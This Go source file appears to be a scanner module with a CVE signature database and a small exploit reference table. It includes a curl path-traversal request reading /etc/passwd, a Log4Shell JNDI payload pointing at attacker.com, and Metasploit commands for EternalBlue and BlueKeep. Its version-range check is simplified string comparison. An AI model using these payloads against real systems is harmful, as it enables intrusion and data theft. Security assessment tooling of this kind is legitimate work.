package main

import (
	"fmt"
	"strings"
)

// VulnerabilityScanner detects known vulnerabilities in services
type VulnerabilityScanner struct {
	VulnDatabase map[string][]VulnSignature
}

// VulnSignature defines a vulnerability signature
type VulnSignature struct {
	CVE              string
	Description      string
	Severity         ThreatLevel
	CVSS             float64
	AffectedVersions []string
	DetectionMethod  string
	Exploit          string
	Mitigation       string
}

// NewVulnerabilityScanner creates a new vulnerability scanner
func NewVulnerabilityScanner() *VulnerabilityScanner {
	vs := &VulnerabilityScanner{
		VulnDatabase: make(map[string][]VulnSignature),
	}

	vs.loadVulnerabilities()
	return vs
}

// loadVulnerabilities loads vulnerability signatures
func (vs *VulnerabilityScanner) loadVulnerabilities() {
	// Apache vulnerabilities
	vs.addVulnerability("apache", VulnSignature{
		CVE:              "CVE-2021-41773",
		Description:      "Path traversal and RCE in Apache HTTP Server 2.4.49-2.4.50",
		Severity:         ThreatLevelCritical,
		CVSS:             9.8,
		AffectedVersions: []string{"2.4.49", "2.4.50"},
		DetectionMethod:  "version",
		Exploit:          "curl 'http://target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'",
		Mitigation:       "Upgrade to Apache 2.4.51 or later",
	})

	// OpenSSH vulnerabilities
	vs.addVulnerability("openssh", VulnSignature{
		CVE:              "CVE-2024-6387",
		Description:      "regreSSHion - RCE in OpenSSH server",
		Severity:         ThreatLevelCritical,
		CVSS:             8.1,
		AffectedVersions: []string{"8.5p1", "9.7p1"},
		DetectionMethod:  "version",
		Mitigation:       "Upgrade to OpenSSH 9.8 or later",
	})

	// MySQL vulnerabilities
	vs.addVulnerability("mysql", VulnSignature{
		CVE:              "CVE-2023-21980",
		Description:      "MySQL Server privilege escalation",
		Severity:         ThreatLevelHigh,
		CVSS:             6.5,
		AffectedVersions: []string{"8.0.32", "5.7.41"},
		DetectionMethod:  "version",
		Mitigation:       "Upgrade to MySQL 8.0.33 or 5.7.42",
	})

	// SMB vulnerabilities (EternalBlue)
	vs.addVulnerability("microsoft-ds", VulnSignature{
		CVE:              "CVE-2017-0144",
		Description:      "EternalBlue - SMBv1 RCE (MS17-010)",
		Severity:         ThreatLevelCritical,
		CVSS:             9.3,
		AffectedVersions: []string{"*"},
		DetectionMethod:  "smb_version_check",
		Exploit:          "Metasploit: exploit/windows/smb/ms17_010_eternalblue",
		Mitigation:       "Apply MS17-010 patch, disable SMBv1",
	})

	// RDP vulnerabilities (BlueKeep)
	vs.addVulnerability("ms-wbt-server", VulnSignature{
		CVE:              "CVE-2019-0708",
		Description:      "BlueKeep - RDP RCE vulnerability",
		Severity:         ThreatLevelCritical,
		CVSS:             9.8,
		AffectedVersions: []string{"*"},
		DetectionMethod:  "rdp_check",
		Exploit:          "Metasploit: exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
		Mitigation:       "Apply Windows updates, enable NLA",
	})

	// Apache Tomcat vulnerabilities
	vs.addVulnerability("tomcat", VulnSignature{
		CVE:              "CVE-2020-1938",
		Description:      "Ghostcat - AJP File Read/Inclusion",
		Severity:         ThreatLevelCritical,
		CVSS:             9.8,
		AffectedVersions: []string{"9.0.0-9.0.30", "8.5.0-8.5.50", "7.0.0-7.0.99"},
		DetectionMethod:  "version",
		Mitigation:       "Upgrade Tomcat or disable AJP connector",
	})

	// Elasticsearch vulnerabilities
	vs.addVulnerability("elasticsearch", VulnSignature{
		CVE:              "CVE-2015-1427",
		Description:      "Elasticsearch RCE via Groovy scripting",
		Severity:         ThreatLevelCritical,
		CVSS:             10.0,
		AffectedVersions: []string{"1.3.0-1.3.7", "1.4.0-1.4.2"},
		DetectionMethod:  "version",
		Exploit:          "POST /_search with malicious Groovy script",
		Mitigation:       "Upgrade to 1.4.3 or later, disable dynamic scripting",
	})

	// Redis vulnerabilities
	vs.addVulnerability("redis", VulnSignature{
		CVE:              "CVE-2022-0543",
		Description:      "Redis Lua sandbox escape and RCE",
		Severity:         ThreatLevelCritical,
		CVSS:             10.0,
		AffectedVersions: []string{"*"},
		DetectionMethod:  "auth_check",
		Mitigation:       "Require authentication, upgrade Redis, firewall rules",
	})

	// Log4j vulnerabilities
	vs.addVulnerability("log4j", VulnSignature{
		CVE:              "CVE-2021-44228",
		Description:      "Log4Shell - RCE in Log4j",
		Severity:         ThreatLevelCritical,
		CVSS:             10.0,
		AffectedVersions: []string{"2.0-2.14.1"},
		DetectionMethod:  "header_injection",
		Exploit:          "${jndi:ldap://attacker.com/a}",
		Mitigation:       "Upgrade to Log4j 2.17.0 or later",
	})

	// WordPress vulnerabilities
	vs.addVulnerability("wordpress", VulnSignature{
		CVE:             "CVE-2023-XXXX",
		Description:     "WordPress plugin vulnerabilities",
		Severity:        ThreatLevelMedium,
		CVSS:            7.5,
		DetectionMethod: "wp_scan",
		Mitigation:      "Update WordPress and all plugins",
	})
}

// addVulnerability adds a vulnerability to the database
func (vs *VulnerabilityScanner) addVulnerability(service string, vuln VulnSignature) {
	serviceLower := strings.ToLower(service)
	if _, exists := vs.VulnDatabase[serviceLower]; !exists {
		vs.VulnDatabase[serviceLower] = make([]VulnSignature, 0)
	}
	vs.VulnDatabase[serviceLower] = append(vs.VulnDatabase[serviceLower], vuln)
}

// ScanService scans a service for vulnerabilities
func (vs *VulnerabilityScanner) ScanService(ip string, port int, service *ServiceInfo) []Vulnerability {
	vulnerabilities := make([]Vulnerability, 0)

	// Normalize service name
	serviceName := strings.ToLower(service.Name)

	// Look up vulnerabilities for this service
	vulnSigs, exists := vs.VulnDatabase[serviceName]
	if !exists {
		// Try common service names
		for key := range vs.VulnDatabase {
			if strings.Contains(serviceName, key) {
				vulnSigs = vs.VulnDatabase[key]
				break
			}
		}
	}

	// Check each vulnerability
	for _, sig := range vulnSigs {
		if vs.isVulnerable(service, sig) {
			vuln := Vulnerability{
				ID:          sig.CVE,
				Severity:    sig.Severity,
				Description: sig.Description,
				Port:        port,
				Service:     service.Name,
				CVSS:        sig.CVSS,
				Exploit:     sig.Exploit,
				Mitigation:  sig.Mitigation,
				References:  []string{fmt.Sprintf("https://nvd.nist.gov/vuln/detail/%s", sig.CVE)},
			}
			vulnerabilities = append(vulnerabilities, vuln)
		}
	}

	return vulnerabilities
}

// isVulnerable checks if a service version is vulnerable
func (vs *VulnerabilityScanner) isVulnerable(service *ServiceInfo, sig VulnSignature) bool {
	if service.Version == "" {
		// Can't determine without version, assume potentially vulnerable
		return true
	}

	// Check if version matches affected versions
	for _, affectedVersion := range sig.AffectedVersions {
		if affectedVersion == "*" {
			return true // All versions affected
		}

		if strings.Contains(service.Version, affectedVersion) {
			return true
		}

		// Version range check (simplified)
		if vs.versionInRange(service.Version, affectedVersion) {
			return true
		}
	}

	return false
}

// versionInRange checks if a version falls within a vulnerable range
func (vs *VulnerabilityScanner) versionInRange(version, rangeSpec string) bool {
	// Simplified version comparison
	// Format: "2.4.49-2.4.50" means versions 2.4.49 through 2.4.50
	if !strings.Contains(rangeSpec, "-") {
		return version == rangeSpec
	}

	parts := strings.Split(rangeSpec, "-")
	if len(parts) != 2 {
		return false
	}

	// Simple string comparison (works for most version formats)
	return version >= parts[0] && version <= parts[1]
}

// ScanForEternalBlue checks if a host is vulnerable to EternalBlue
func (vs *VulnerabilityScanner) ScanForEternalBlue(ip string) bool {
	// Simplified check - in real implementation would do SMB protocol checks
	fmt.Printf("[VULN] Checking %s for EternalBlue (MS17-010)...\n", ip)
	// Would perform actual SMB handshake and check for vulnerability
	return false
}

// ScanForBlueKeep checks if a host is vulnerable to BlueKeep
func (vs *VulnerabilityScanner) ScanForBlueKeep(ip string) bool {
	fmt.Printf("[VULN] Checking %s for BlueKeep (CVE-2019-0708)...\n", ip)
	// Would perform actual RDP checks
	return false
}

// ScanWebVulnerabilities scans web services for common vulnerabilities
func (vs *VulnerabilityScanner) ScanWebVulnerabilities(ip string, port int) []Vulnerability {
	vulnerabilities := make([]Vulnerability, 0)

	// Check for common web vulnerabilities
	checks := []struct {
		name        string
		cve         string
		description string
		severity    ThreatLevel
	}{
		{
			"SQL Injection",
			"CVE-XXXX-XXXX",
			"Potential SQL injection vulnerability",
			ThreatLevelHigh,
		},
		{
			"XSS",
			"CVE-XXXX-XXXX",
			"Potential Cross-Site Scripting vulnerability",
			ThreatLevelMedium,
		},
		{
			"Directory Traversal",
			"CVE-XXXX-XXXX",
			"Potential directory traversal vulnerability",
			ThreatLevelHigh,
		},
	}

	for _, check := range checks {
		// Would perform actual vulnerability checks here
		// This is a placeholder for demonstration
		_ = check
	}

	return vulnerabilities
}

// ExploitDatabase provides information about available exploits
type ExploitDatabase struct {
	Exploits map[string]ExploitInfo
}

// ExploitInfo contains information about an exploit
type ExploitInfo struct {
	CVE         string
	Name        string
	Type        string // metasploit, manual, poc
	Command     string
	Description string
	References  []string
}

// NewExploitDatabase creates a new exploit database
func NewExploitDatabase() *ExploitDatabase {
	ed := &ExploitDatabase{
		Exploits: make(map[string]ExploitInfo),
	}

	ed.loadExploits()
	return ed
}

// loadExploits loads exploit information
func (ed *ExploitDatabase) loadExploits() {
	// EternalBlue exploit
	ed.Exploits["CVE-2017-0144"] = ExploitInfo{
		CVE:         "CVE-2017-0144",
		Name:        "EternalBlue",
		Type:        "metasploit",
		Command:     "use exploit/windows/smb/ms17_010_eternalblue",
		Description: "SMBv1 Remote Code Execution",
		References: []string{
			"https://www.exploit-db.com/exploits/42315",
			"https://github.com/3ndG4me/AutoBlue-MS17-010",
		},
	}

	// BlueKeep exploit
	ed.Exploits["CVE-2019-0708"] = ExploitInfo{
		CVE:         "CVE-2019-0708",
		Name:        "BlueKeep",
		Type:        "metasploit",
		Command:     "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
		Description: "RDP Remote Code Execution",
		References: []string{
			"https://www.exploit-db.com/exploits/47120",
		},
	}

	// Log4Shell exploit
	ed.Exploits["CVE-2021-44228"] = ExploitInfo{
		CVE:         "CVE-2021-44228",
		Name:        "Log4Shell",
		Type:        "manual",
		Command:     "${jndi:ldap://attacker.com:1389/a}",
		Description: "Log4j Remote Code Execution",
		References: []string{
			"https://github.com/kozmer/log4j-shell-poc",
		},
	}
}

// GetExploit retrieves exploit information for a CVE
func (ed *ExploitDatabase) GetExploit(cve string) *ExploitInfo {
	if exploit, exists := ed.Exploits[cve]; exists {
		return &exploit
	}
	return nil
}
